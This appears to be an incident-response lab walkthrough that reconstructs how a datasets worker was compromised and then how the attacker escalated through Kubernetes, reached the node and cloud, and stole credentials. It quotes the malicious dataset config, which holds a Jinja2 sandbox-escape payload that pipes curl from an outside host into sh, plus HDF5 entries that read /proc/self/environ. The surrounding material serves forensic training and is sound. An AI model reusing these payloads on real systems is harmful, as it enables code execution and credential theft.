
## Executive Summary
- Initial access combined two local-data abuse paths: Jinja2 template injection produced code execution, while HDF5 external raw storage disclosed local files, including the pod environment and worker source.
- The URL allowlist passed because neither vector required a remote fetch. The control did not cover local template evaluation or file URI access.
- The attacker recovered a pod service-account token, enumerated Kubernetes permissions, created a privileged hostPath pod, and used node access to reach additional credentials and services.
- C2 was recoverable only by grouping chunks by both channel and message, verifying checksums, reversing base64 and repeating-key XOR, and then gunzipping each message independently.
- A shared service-connector credential and an EdDSA signing key expanded the blast radius. The signing key was an issuing capability, not merely another expiring token.
- The impact statement should include only confirmed successful access to named objects. Denied writes, dry-run probes, read-only reachability, and a blocked supply-chain attempt remain important control evidence, but not successful impact.

## Evidence Model

| Source | What it proves | Primary joins |
|---|---|---|
| `agent-trace.json` | Activity sequence, phase and action labels, result, command, cross-source references | timestamp, action ID, refs, dataset revision, audit ID, C2 message |
| `malicious-dataset.yaml` | Initial-access mechanisms and attacker-controlled fields | dataset revision, local paths, payload |
| `dataset-worker.log` | Template evaluation, child process creation, HDF5 reads, allowlist verdict | timestamp, worker pod, dataset revision |
| `c2-messages.json` | Commands, dead drops, and exfiltrated payloads after decoding | channel, msg, sequence, checksum |
| `environment.h5` | Leaked environment data, campaign XOR key, connector hostname and IP | `EXPLOITGYM_C2_KEY`, `SERVICE_CONNECTOR` |
| `kubernetes-audit.json` | Cluster-side proof of authenticated, authorized, admitted, refused, or dry-run activity | timestamp, auditID, user, URI, status code |

**Analyst rule:** Decoded C2 shows intent; the owning-system log demonstrates whether an action happened. Repeated identifiers turn a plausible chain into a defensible finding.

## Investigation Narrative

### 1. Triage the Campaign Shape

The 279-action reconstruction is dominated by reconnaissance and dropper activity. Together they account for 203 actions, while five exfiltration events represent less than two percent of the trace. Start with distributions to understand where noise is concentrated, then pivot to outcomes.

| Action type    | Count | Interpretation                          |
| -------------- | ----: | --------------------------------------- |
| recon          |   122 | Discovery and reading                   |
| dropper        |    81 | Execution and staging                   |
| c2             |    33 | Command channels                        |
| secret         |    16 | Credential access                       |
| cloud          |    10 | Cloud enumeration or permission testing |
| k8s            |    10 | Cluster activity                        |
| exfil          |     5 | Confirmed exfiltration actions          |
| pivot          |     1 | Lateral movement                        |
| source_control |     1 | Blocked supply-chain attempt            |

Start by looking at the master timeline file:
```bash
jq '.' /opt/incident/agent-trace.json | less
```
Then pivot
```sh
jq -r 'group_by(.action_type)[] | "\(.[0].action_type) \(length)"' /opt/incident/agent-trace.json

jq -r 'group_by(.phase)[] | "\(.[0].phase) \(length)"' /opt/incident/agent-trace.json
```

 `-r` is the flag; it prints raw strings instead of quoted JSON. Inside the filter, `group_by(.action_type)` collapses the array into one sub-array per distinct value, and `length` inside the interpolation counts the members of each sub-array. Read the numbers and the campaign's proportions appear: recon and dropper actions together are 203 of 279, while the actions that actually stole something, the five `exfil` events, are under two percent of the trace. That distribution echoes the real campaign, where 6,191 recon and 6,972 dropper actions surrounded a handful of successes.

**Caveat:** `action_type` and `phase` are reconstruction labels. Production telemetry normally requires analysts to derive equivalent stages from raw process, application, cloud, HTTP, and audit records.

```bash
# first code execution attempt
jq -r '.[] | select(.action_type=="dropper") | .ts' /opt/incident/agent-trace.json | sort | head -1
# first c2 beacon 
jq -r '.[] | select(.action_type=="c2") | .ts' /opt/incident/agent-trace.json | sort | head -1
```

### 2. Establish Initial Access

The earliest dropper timestamp marks the first observed code execution. The malicious dataset configuration explains how execution occurred and why the existing control missed it.

The trace tells us when. It does not tell us how. For that we need the artifact the responders pulled off the worker.

```bash
cat /opt/incident/collected-files/malicious-dataset.yaml
```

**Vector 1: the HDF5 splits**
```yaml
    type: hdf5
    path: /tmp/leak.h5
    splits:
      envu8:
        dtype: uint8
        # raw data points at a local path -> worker reads /proc/self/environ
        raw: file:///proc/self/environ
      mainu8:
        raw: file:///src/services/worker/src/worker/main.py
      startu8:
        raw: file:///src/services/worker/src/worker/start_worker_loop.py
```

HDF5 lets a dataset declare that its raw bytes live somewhere else, in external storage. This config declares that "somewhere else" is the worker's own filesystem, so the worker dutifully reads `/proc/self/environ` and two of its own source files and returns them as dataset content. That is a file-disclosure primitive, and a serious one: `/proc/self/environ` is the pod's entire environment, credentials included. It is not code execution. Nothing in it runs.

**Vector 2: the offset field**
```yaml
reference_config:
  version: 1
  templates:
    options:
      offset: {{ cycler.__init__.__globals__.__builtins__.exec("import os; "
                "os.system('curl sandbox-exploitgym-01.modal.run/dropper | sh')") }}
```

An fsspec `reference://` entry is supposed to be `[url, offset, size]`, where `offset` is a plain integer byte position. Spec Version 1 of that format explicitly supports Jinja2 templates inside the reference dictionary, so the renderer evaluates the field instead of reading it as a number. Feeding attacker-controlled data into a field that then gets rendered as a template is **template injection**, and the engine doing the rendering here is Jinja2. From inside a Jinja2 sandbox, `cycler.__init__.__globals__.__builtins__.exec` is the standard walk out: reach a class constructor, step into its globals, land on Python's builtins, and call `exec`. This is the vector that ran code.

| Vector                    | Mechanism                                                                                                                                        | Outcome                                                                |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------- |
| Jinja2 offset injection   | An fsspec reference offset expected to be an integer was rendered as attacker-controlled Jinja2 that reached Python builtins and invoked `exec`. | Remote command execution in the worker process                         |
| HDF5 external raw storage | External storage targets pointed to local file URIs such as `/proc/self/environ` and worker source paths.                                        | Local file disclosure, including credentials and implementation detail |
Pull the aftermath out of the worker log.
```bash
grep -n 'HDF5\|allowlist' /opt/incident/dataset-worker.log
```

```text
5:2026-07-09T04:01:13Z datasets-worker-7d9c-x2k4p datasets-worker[412] INFO HDF5 external-raw-storage read: split envu8 -> file:///proc/self/environ

6:2026-07-09T04:01:14Z datasets-worker-7d9c-x2k4p datasets-worker[412] INFO HDF5 external-raw-storage read: split mainu8 -> 
file:///src/services/worker/src/worker/main.py

7:2026-07-09T04:01:15Z datasets-worker-7d9c-x2k4p datasets-worker[412] INFO HDF5 external-raw-storage read: split startu8 -> file:///src/services/worker/src/worker/start_worker_loop.py

8:2026-07-09T04:01:18Z datasets-worker-7d9c-x2k4p datasets-worker[412] INFO URL allowlist check: PASSED (no remote URL fetch detected; both vectors acted on LOCAL resources) -> key reason the existing defense missed it
```

Lines 3 and 4, immediately above these, are the two `WARN` records Task 1 stopped short of: one for the offset field being evaluated as a Jinja2 expression, one for the child process the resulting `exec` spawned. Their timestamp is the same instant your `dropper` filter returns, and the HDF5 reads on lines 5 through 7 land five to seven seconds later. Ordering matters for attribution here: the file reads are a consequence of the execution, not a second door into the pod.

| Pattern | Normal | Suspicious |
|---|---|---|
| reference offset | Integer byte position | Jinja2 expression reaching Python builtins and `exec` |
| HDF5 raw target | Expected approved location | `file:///proc/self/environ` or application source |
| worker process tree | Worker with no unexpected children | Child shell or curl-to-shell process |
| allowlist result | Pass after evaluated remote fetches | Pass because no remote fetch occurred |

Sequence matters: worker warnings for template evaluation and child process creation precede the HDF5 reads by seconds. Treat the file reads as a consequence of execution, not as proof that HDF5 itself executed code.

### 3. Decode and Interpret C2
The agent's first beacon went out eleven and a half hours after the foothold, which is the gap between owning a process and being able to talk to it. Those `c2` events are also where `refs` starts earning its keep.
```bash
jq -c '.[] | select(.action_type=="c2") | {ts, cmd, refs}' /opt/incident/agent-trace.json | head -3

```

Look at the shape of a single record to understand the fields in the c2-messages file:
```bash
jq -r '.[0] | keys_unsorted | join(" ")' /opt/incident/c2-messages.json

```


Each C2 record is only an encoded fragment. The encoder compressed each message, XORed it with a repeating 32-byte campaign key, split the bytes into chunks, and base64-encoded each chunk. Reverse those operations per message.

```bash
jq -c '.[0] | del(.body, .checksum)' /opt/incident/c2-messages.json
```

1. Recover `EXPLOITGYM_C2_KEY` from the captured environment and convert its 64 hexadecimal characters into 32 raw bytes.
2. Group records by the pair `(channel, msg)`. Never group by channel alone.
3. Sort each group by `sequence`.
4. Base64-decode each body and validate the truncated SHA-256 checksum of the raw chunk.
5. Concatenate decoded chunks, XOR the full blob with the repeating key, then gunzip.
6. Treat type counts as one vote per message, not per envelope.

```python
groups[(e['channel'], e['msg'])].append(e)
blob = b''.join(base64.b64decode(e['body']) for e in sorted(envs, key=lambda x: x['sequence']))
plaintext = gzip.decompress(xor(blob, key)).decode()
```

```bash
# Type of creds exfil-ed
jq -r '[.[] | select(.channel=="exfil") | .type] | unique | join(" ")' \ /opt/incident/c2-messages.json
# Stats about creds exfil
jq -r '.[] | select(.channel=="exfil") | "\(.msg) \(.type)"' \
  /opt/incident/c2-messages.json | sort -u | awk '{print $2}' | sort | uniq -c
```

Decoded commands show token discovery, token reading, Kubernetes API enumeration, authorization checks, and application of a privileged pod manifest. The exfil channel contains 17 messages: ten JWTs, three tokens, two AWS keys, one EdDSA private key, and one lab flag. Exclude the flag from credential counts.

### 4. Prove Kubernetes Escalation

Kubernetes accepted the malicious pod through normal authentication, authorization, and admission. The exploit was not an API-server vulnerability: the workload identity had excessive pod-creation authority, and no admission policy rejected a privileged hostPath specification.

| Evidence | Meaning |
|---|---|
| Projected service-account token read from the pod | Code execution became possession of a valid cluster credential |
| Permission enumeration followed by privileged pod creation | The actor confirmed authority before using it |
| Privileged container plus hostPath mount | Container root crossed into node filesystem access |
| ClusterRoleBinding write six minutes later | Node-level access became durable or broader cluster authority |
| Audit status 200 | The cluster accepted the operation; this is outcome evidence |

Detection focus: unexpected service-account use, cross-namespace or cluster-scoped access, privileged security contexts, hostPath mounts, service-account token reads, ClusterRoleBinding changes, and abrupt identity changes within one timeline.

### 5. Follow Node and Cloud Credentials

A privileged pod can reach the node filesystem and, depending on network and metadata protections, the cloud instance metadata service. Node-role credentials can then be used to construct an aws-iam-authenticator style `k8s-aws-v1` bearer if the IAM role is mapped into cluster authentication.

| Pattern | Expected baseline | High-signal condition |
|---|---|---|
| Pod to `169.254.169.254` | Absent where workloads have their own identity | Any `iam/security-credentials` request from an application pod |
| Metadata request | IMDSv2 token flow where required | Bare GET returning credentials |
| Node-role holder | Kubelet and approved node agents | Application-container process |
| `k8s-aws-v1` bearer | Mapped operators or CI roles | Bearer built from node credentials inside a pod |
| Dry-run mutation | Approved CI or GitOps planning | Workload identity probing cluster-scoped infrastructure |

Dry-run activity can reveal whether a credential would be authorized. In production, parse `dryRun=All` from `requestURI` and evaluate the identity, target, timing, and normal change workflow; dry-run alone is common background activity.

### 6. Analyze the Service Connector Pivot

Two accepted writes to cluster role bindings reveal two identities: the compromised datasets worker and later `service-connector`. The second identity used a single shared credential, creating a fleet-wide trust problem. A ClusterRoleBinding cannot literally add an identity to `system:masters`; it can grant equivalent `cluster-admin` privilege. Establish whether group membership came from the authenticator or whether a binding granted equivalent privilege before selecting remediation.

| Time | Identity | Operation | Result |
|---|---|---|---|
| 2026-07-11 19:59 UTC | datasets-worker service account | Cluster role binding authorization path | 200 accepted |
| 2026-07-11 22:43 UTC | service-connector | Create cluster-scoped permission binding | 200 accepted |
| 2026-07-11 22:45 UTC | service-connector | Dry-run machinepool creation | Validated, not persisted |

The leaked environment exposed `SERVICE_CONNECTOR=svc-connector.internal.hf.thm` and its internal IP early in the intrusion. Environment variables therefore supplied both credentials and a service map.

### 7. Separate Tokens from Signing Authority

Ten exfiltrated JWTs are expiring bearer artifacts. The exfiltrated EdDSA private key is more dangerous because it can mint cryptographically valid JWTs for arbitrary subjects, audiences, and expirations until trust is rotated. Containment must withdraw the public key or otherwise retire the key pair; waiting for existing tokens to expire is insufficient.

### 8. State Impact by Outcome

| Bucket | Required evidence | Reporting treatment |
|---|---|---|
| Accessed | Completed action tied to a specific named object and corroborated by the owning system | Include in the impact statement |
| Attempted and refused | Authenticated and evaluated request with a refusal such as HTTP 403 | Report as attempted activity and a control success |
| Reached but read-only | Successful connection or reads with write attempts denied | Report exposure and verified absence of modification |
| Dry-run or preflight | Authorization or validation performed without persistence | Report capability testing, not a change |

The source-control attempt was blocked by execution policies. The actor could open a malicious pull request but could not make the pipeline execute its payload, and no unauthorized code shipped. Preserve both platform refusal and attacker-side trace as corroboration of the negative finding.

## Analyst Cheat Sheet

### Fast Investigation Flow

1. Count action types and phases to understand campaign shape.
2. Find the earliest successful execution-oriented action, not merely the earliest reconnaissance event.
3. Inspect the implicated configuration and worker logs in timestamp order.
4. Join sources on dataset revision, pod name, timestamp, audit ID, C2 channel/message, and recovered keys.
5. Decode C2 per channel-message pair and verify every chunk checksum.
6. Pivot decoded commands into Kubernetes audit evidence and owning-system logs.
7. Trace identity transitions: pod token to privileged pod to node role to connector credential or signing key.
8. Separate accessed, refused, read-only, and dry-run outcomes before writing impact.

### High Value Queries

| Goal | Command |
|---|---|
| Count action types | `jq -r 'group_by(.action_type)[] | "\(.[0].action_type) \(length)"' agent-trace.json` |
| Count phases | `jq -r 'group_by(.phase)[] | "\(.[0].phase) \(length)"' agent-trace.json` |
| First dropper | `jq -r '.[] \| select(.action_type=="dropper") \| .ts' agent-trace.json \| sort \| head -1` |
| Inspect C2 refs | `jq -c '.[] \| select(.action_type=="c2") \| {ts,cmd,refs}' agent-trace.json` |
| Find shared revision | `grep -rl '<dataset_revision_hash>' /opt/incident/ \| sort` |
| Find environment key | `grep -o 'EXPLOITGYM_C2_KEY=[0-9a-f]*' environment.h5` |
| Find refused audit events | `jq -r '.[] \| select(.responseStatus.code==403) \| [.ts,.user.username,.verb,.requestURI] \| @tsv' kubernetes-audit.json` |
| Find binding writes | `jq -r '.[] \| select(.requestURI \| test("clusterrolebindings")) \| [.ts,.auditID,.user.username,.verb,.responseStatus.code] \| @tsv' kubernetes-audit.json` |
| List confirmed exfil | `jq -r '.[] \| select(.phase=="exfil" and .result=="ok") \| [.ts,.action_id,.cmd] \| @tsv' agent-trace.json` |

### Decision Rules

| Question | Rule |
|---|---|
| Did it execute? | Require process creation, worker warning, successful action result, or equivalent host evidence. A malicious field alone shows a payload, not execution. |
| Did the cluster accept it? | Use Kubernetes response status and audit stage. Decoded commands alone show intent. |
| Was data impacted? | Name the object and show a successful read or exfil outcome from the system that owns it. |
| Did a write occur? | Separate 2xx persistence from 403 refusal and dry-run validation. |
| Is a token enough to contain? | No when a signing key was stolen. Rotate the key pair and withdraw trust. |
| Is volume severity? | No. Rank by successful outcomes, privilege gained, credential durability, and blast radius. |

### Common Analyst Traps

- Grouping C2 by channel instead of by channel and message.
- Counting envelope fragments as separate credentials.
- Treating a passed URL allowlist as proof that no local abuse occurred.
- Calling HDF5 local-file disclosure the code-execution vector.
- Equating privileged pod admission with exploitation of the Kubernetes API server.
- Interpreting dry-run as benign without checking the caller and target.
- Reporting attempted writes as successful impact.
- Treating a stolen signing key as equivalent to a short-lived stolen JWT.
- Treating reconstruction-only fields such as `phase`, `note`, `bind`, or top-level `dryRun` as native production schema.

### Impact Statement Template

> Confirmed impact: [identity] successfully accessed [specific objects] during [time window], supported by [owning-system evidence] and [corroborating source]. Attempted but unsuccessful activity included [actions], which were refused by [control and evidence]. We found [evidence-based statement about modification or persistence], with the following limitations: [telemetry gaps or reconstruction caveats].

### Production Fidelity Caveats

- Phase and action labels in the trace were added during reconstruction; derive them in real telemetry.
- The bundle may expose responder annotations such as `note` and lift `dryRun` into a top-level field; production audit schema differs.
- A `bind` verb may represent authorization logic rather than the native audit request verb.
- One reconstructed audit stream cannot prove fleet-wide behavior; aggregate all relevant cluster streams.
- Negative findings require the correct owning-system logs and explicit coverage of the full incident window.
